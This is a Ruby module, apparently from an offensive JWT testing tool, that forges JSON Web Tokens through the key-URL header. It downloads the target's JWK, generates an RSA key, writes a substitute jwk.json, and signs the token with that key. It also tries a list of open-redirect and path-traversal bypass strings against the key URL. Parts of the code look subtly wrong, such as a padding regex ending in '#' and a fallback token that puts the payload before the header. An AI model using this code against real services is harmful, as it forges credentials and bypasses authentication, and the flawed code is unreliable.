module JWTred
    def redirect
        if ARGS[:jwtoken]
            info = General.try_seperate(ARGS[:jwtoken])
            jwtoken = Token.new(info[0], info[1], info[2], info[3])
            if val=General.httpcheck(jwtoken.header)
                General.showtoken(ARGS[:jwtoken])
                val = General.jwkcheck(jwtoken.header)
                json_file = General.wgetjwk(val)
                ARGV.clear
                if General.rsacheck(json_file)
                    General.createpem
                    priv = General.getpemrsa
                    puts "#"*72
                    puts "Do you want to create new signature and json output? Yes[y/Y] - No[n/N] "
                    condition = General.yesorno
                    if condition
                        pub = priv.public_key
                        n = Base64.urlsafe_encode64(pub.n.to_s(2)).gsub(/=+$/,"")
                        e = Base64.urlsafe_encode64(pub.e.to_s(2)).gsub(/=+$/,"")
                        new_jwk = General.newjwk(JSON.parse(json_file), n, e)
                        File.write("jwtracker_jwk.json", new_jwk)
                        token = Base64.urlsafe_encode64(jwtoken.header.to_json).gsub(/=+$/,"")+"."
                        token+= Base64.urlsafe_encode64(jwtoken.payload.to_json).gsub(/=+$/,"")
                        signature = priv.sign("SHA256", token)
                        signature = Base64.urlsafe_encode64(signature).gsub(/=+#/,"")
                        puts "#"*72
                        puts "***\t Your Signature Has Been Created \t***"
                        puts "New Created Header: "+jwtoken.header
                        puts "New Created Payload: "+jwtoken.payload
                        puts "New Auth Token: "+token+"."+signature
                        puts "..!\"jwk.json\" File Has Been Created. Please use it for authentication!.. "
                        tokenflag = true
                    end
                end
                puts "Do you want to try redirect to jwt? Yes[y/Y] - No[n/N]" if val=General.httpcheck(jwtoken.header)
                condition = General.yesorno
                if condition
                    uri_key = General.httpvar(jwtoken.header)
                    puts "Trying to ByPass this URL: "+val
                    bypass_array = ["/redirect?redirect_uri=https://www.google.com","/../redirect?redirect_uri=https://www.google.com","/../../redirect?redirect_uri=https://www.google.com","/../../../redirect?redirect_uri=https://www.google.com","@google.com","/../@google.com","/../../@google.com","/../../../@google.com"]
                    if General.redirectit(val, bypass_array)
                        puts "Do you want to make change on Header? Yes[y/Y] - No[n/N]"
                        condition = General.yesorno
                        if condition
                            jwtoken.header = General.kchange(jwtoken.header,uri_key)
                        end
                    end
                    puts "#"*72
                end
                if !tokenflag
                    puts ""
                    token = Base64.strict_encode64(jwtoken.payload).gsub(/=+$/,"")+"."
                    token+= Base64.strict_encode64(jwtoken.header).gsub(/=+$/,"")
                    puts "Final token is:"
                    puts token
                    puts "  ..! PLEASE SING IT WITH A KEY !.."
                end
                #puts jwtoken.header,jwtoken.payload,jwtoken.signature
                exit
            end
        end
    end
end